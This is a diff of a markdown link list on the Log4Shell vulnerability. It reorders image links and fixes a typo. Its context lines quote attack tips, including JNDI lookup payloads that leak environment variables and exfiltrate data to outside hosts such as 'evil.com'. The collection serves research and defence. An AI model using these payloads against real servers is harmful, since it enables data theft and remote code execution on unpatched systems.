@@ -8,13 +8,13 @@
 
 [Source: cutekernel.github.io](https://cutekernel.github.io/technical-illustrations/cves-2021.html)
 
-![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)
-
-[Source: musana.net](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
-
 ![log4j_attack](https://user-images.githubusercontent.com/35920302/146178704-84116a6f-1016-43c4-b1f3-0552dfa0fb03.png)
 
 [Source: govcert.ch](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
+
+![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)
+
+[Source: musana.net](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
 
 # Technical analysis
 - [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
@@ -57,7 +57,7 @@
 - [The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars](https://twitter.com/_StaticFlow_/status/1469358229767475205)
 - [Tutorial on setting up RogueJDNI](https://twitter.com/ITSecurityguard/status/1469347404986077185)
 - [Class path is useful information to have to know what gadgets should be available or where you need to look for some to get rce.](https://twitter.com/jstnkndy/status/1469752457618202624)
-- [Some events are only logged when an exception ocur, so specially long payloads with unexpected characters may help you trigger those exceptions.](https://twitter.com/pwntester/status/1470435811812380675)
+- [Some events are only logged when an exception occur, so specially long payloads with unexpected characters may help you trigger those exceptions.](https://twitter.com/pwntester/status/1470435811812380675)
 - [If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
 - [Attack path works in *ANY* java version](https://twitter.com/marcioalm/status/1470361495405875200)
 - [If you’re scanning for Log4Shell at scale, you can easily determine which host is pinging back by adding it to the start of your callback hostname](https://twitter.com/hakluke/status/1469875175839584257)
